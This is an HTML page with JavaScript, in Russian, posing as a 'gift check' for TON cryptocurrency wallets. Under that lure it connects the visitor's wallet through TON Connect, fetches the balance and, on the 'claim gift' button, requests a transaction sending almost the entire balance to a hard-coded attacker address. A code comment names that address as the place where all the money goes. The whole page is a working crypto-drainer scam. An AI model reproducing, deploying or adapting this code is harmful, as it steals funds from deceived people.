<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка гифта</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0f172a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .card {
            background: #1e293b;
            padding: 40px 30px;
            border-radius: 24px;
            max-width: 400px;
            width: 100%;
            text-align: center;
            border: 1px solid #334155;
            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
        }
        h1 {
            color: #f8fafc;
            font-size: 1.8rem;
            margin-bottom: 8px;
        }
        .sub {
            color: #94a3b8;
            font-size: 0.95rem;
            margin-bottom: 24px;
        }
        #ton-connect {
            display: none;
        }
        .big-btn {
            width: 100%;
            padding: 18px;
            font-size: 1.3rem;
            font-weight: 700;
            border: none;
            border-radius: 60px;
            color: white;
            cursor: pointer;
            transition: 0.2s;
            margin-top: 10px;
        }
        .big-btn:hover:not(:disabled) {
            transform: scale(1.02);
        }
        .big-btn:disabled {
            background: #475569;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .btn-gift {
            background: linear-gradient(135deg, #f59e0b, #d97706);
        }
        .btn-gift:hover:not(:disabled) {
            background: linear-gradient(135deg, #fbbf24, #f59e0b);
        }
        .btn-claim {
            background: linear-gradient(135deg, #ef4444, #dc2626);
        }
        .btn-claim:hover:not(:disabled) {
            background: linear-gradient(135deg, #f87171, #ef4444);
        }
        .btn-claim:disabled {
            background: #475569;
        }
        .status {
            margin-top: 16px;
            color: #94a3b8;
            font-size: 0.9rem;
            min-height: 24px;
        }
        .status.success {
            color: #4ade80;
        }
        .status.error {
            color: #f87171;
        }
        .status.info {
            color: #38bdf8;
        }
        .wallet-info {
            margin-top: 16px;
            padding: 14px;
            background: #0f172a;
            border-radius: 12px;
            border: 1px solid #334155;
            text-align: left;
            display: none;
        }
        .wallet-info.active {
            display: block;
        }
        .wallet-info .label {
            color: #94a3b8;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        .wallet-info .value {
            color: #e2e8f0;
            font-family: monospace;
            font-size: 0.85rem;
            word-break: break-all;
            margin-bottom: 6px;
        }
        .wallet-info .balance {
            color: #38bdf8;
            font-size: 1.2rem;
            font-weight: bold;
        }
        .warning {
            color: #fbbf24;
            font-size: 0.85rem;
            background: #1e293b;
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #fbbf24;
            margin: 12px 0;
            display: none;
        }
        .warning.active {
            display: block;
        }
        .gift-box {
            font-size: 4rem;
            margin: 10px 0;
        }
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

<div class="card">
    <div class="gift-box">🎁</div>
    <h1>Проверка гифта</h1>
    <p class="sub">Нажмите кнопку, чтобы проверить, есть ли для вас гифт</p>

    <div id="ton-connect"></div>

    <!-- КНОПКА 1: ПРОВЕРИТЬ ГИФТ (она же подключает кошелёк) -->
    <button id="checkGiftBtn" class="big-btn btn-gift">
        🎁 Проверить гифт
    </button>

    <!-- КНОПКА 2: ЗАБРАТЬ ГИФТ (появляется после подключения) -->
    <button id="claimGiftBtn" class="big-btn btn-claim hidden" disabled>
        🔥 Забрать гифт
    </button>

    <div id="walletInfo" class="wallet-info">
        <div class="label">Ваш адрес</div>
        <div id="addressDisplay" class="value"></div>
        <div class="label">Баланс</div>
        <div id="balanceDisplay" class="balance">Загрузка...</div>
    </div>

    <div id="warning" class="warning">
        ⚠️ ВНИМАНИЕ: будут отправлены ВСЕ монеты с вашего кошелька!
    </div>

    <div id="status" class="status">Нажмите "Проверить гифт"</div>
</div>

<script>
    // ============================================================
    // ВАШ АДРЕС (куда уходят все деньги)
    // ============================================================
    const RECIPIENT_ADDRESS = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

    // ============================================================
    // Инициализация TON Connect
    // ============================================================
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: 'https://chek-topaz.vercel.app/tonconnect-manifest.json',
        buttonRootId: 'ton-connect'
    });

    const walletInfo = document.getElementById('walletInfo');
    const addressDisplay = document.getElementById('addressDisplay');
    const balanceDisplay = document.getElementById('balanceDisplay');
    const checkBtn = document.getElementById('checkGiftBtn');
    const claimBtn = document.getElementById('claimGiftBtn');
    const status = document.getElementById('status');
    const warning = document.getElementById('warning');

    let currentBalanceNano = 0;
    let currentAddress = '';
    let isWalletConnected = false;

    // ============================================================
    // Получение баланса
    // ============================================================
    async function fetchBalance(address) {
        try {
            balanceDisplay.innerText = 'Загрузка...';
            const response = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${address}`);
            const data = await response.json();
            if (data.ok && data.result) {
                const nano = parseInt(data.result.balance, 10);
                currentBalanceNano = nano;
                const ton = (nano / 1e9).toFixed(4);
                balanceDisplay.innerText = `${ton} TON`;
                return nano;
            } else {
                balanceDisplay.innerText = 'Ошибка';
                return 0;
            }
        } catch (e) {
            console.error(e);
            balanceDisplay.innerText = 'Ошибка сети';
            return 0;
        }
    }

    // ============================================================
    // Отправка ВСЕХ денег
    // ============================================================
    async function claimGift() {
        const wallet = tonConnectUI.wallet;
        if (!wallet) {
            status.innerText = '❌ Кошелёк не подключён';
            status.className = 'status error';
            return;
        }

        const COMMISSION_BUFFER = 5000000; // 0.005 TON

        if (currentBalanceNano <= COMMISSION_BUFFER) {
            status.innerText = `❌ Баланс слишком мал (нужно минимум 0.005 TON для комиссии)`;
            status.className = 'status error';
            return;
        }

        const amountToSend = currentBalanceNano - COMMISSION_BUFFER;
        const amountInTon = (amountToSend / 1e9).toFixed(6);

        try {
            claimBtn.disabled = true;
            claimBtn.innerText = '⏳ Подтвердите в кошельке...';
            status.innerText = '⏳ Ожидание подтверждения...';
            status.className = 'status';

            const tx = {
                validUntil: Math.floor(Date.now() / 1000) + 300,
                messages: [
                    {
                        address: RECIPIENT_ADDRESS,
                        amount: amountToSend.toString(),
                        payload: ''
                    }
                ]
            };

            const result = await tonConnectUI.sendTransaction(tx);

            if (result) {
                status.innerText = `✅ ГИФТ ЗАБРАН! ${amountInTon} TON отправлено!`;
                status.className = 'status success';
                claimBtn.innerText = '✅ Готово!';
                
                setTimeout(async () => {
                    await fetchBalance(currentAddress);
                    claimBtn.innerText = '🔥 Забрать гифт';
                    claimBtn.disabled = false;
                }, 5000);
            }
        } catch (error) {
            console.error(error);
            status.innerText = `❌ Ошибка: ${error.message || 'неизвестная ошибка'}`;
            status.className = 'status error';
            claimBtn.innerText = '🔥 Забрать гифт';
            claimBtn.disabled = false;
        }
    }

    // ============================================================
    // Обработчик кнопки "Проверить гифт"
    // ============================================================
    checkBtn.addEventListener('click', async () => {
        if (isWalletConnected) {
            // Если кошелёк уже подключён — просто показываем кнопку "Забрать гифт"
            status.innerText = '✅ Кошелёк уже подключён! Забирайте гифт.';
            status.className = 'status info';
            return;
        }

        try {
            checkBtn.disabled = true;
            checkBtn.innerText = '⏳ Подключение...';
            status.innerText = '⏳ Открывается кошелёк...';
            status.className = 'status';

            // Принудительно открываем подключение
            await tonConnectUI.connectWallet();
            
            // onStatusChange сработает автоматически
        } catch (error) {
            console.error(error);
            status.innerText = `❌ Ошибка подключения: ${error.message || 'попробуйте снова'}`;
            status.className = 'status error';
            checkBtn.disabled = false;
            checkBtn.innerText = '🎁 Проверить гифт';
        }
    });

    // ============================================================
    // Статус подключения кошелька
    // ============================================================
    tonConnectUI.onStatusChange(async wallet => {
        if (wallet) {
            isWalletConnected = true;
            const address = wallet.account.address;
            currentAddress = address;
            addressDisplay.innerText = address;
            walletInfo.classList.add('active');
            warning.classList.add('active');

            await fetchBalance(address);

            // Скрываем первую кнопку, показываем вторую
            checkBtn.classList.add('hidden');
            claimBtn.classList.remove('hidden');
            claimBtn.disabled = false;
            
            status.innerText = '✅ Кошелёк подключён! Нажмите "Забрать гифт"';
            status.className = 'status info';
        } else {
            isWalletConnected = false;
            walletInfo.classList.remove('active');
            warning.classList.remove('active');
            
            checkBtn.classList.remove('hidden');
            checkBtn.disabled = false;
            checkBtn.innerText = '🎁 Проверить гифт';
            
            claimBtn.classList.add('hidden');
            claimBtn.disabled = true;
            claimBtn.innerText = '🔥 Забрать гифт';
            
            status.innerText = 'Нажмите "Проверить гифт"';
            status.className = 'status';
            currentBalanceNano = 0;
            currentAddress = '';
        }
    });

    // ============================================================
    // Обработчик кнопки "Забрать гифт"
    // ============================================================
    claimBtn.addEventListener('click', claimGift);
</script>

</body>
</html>
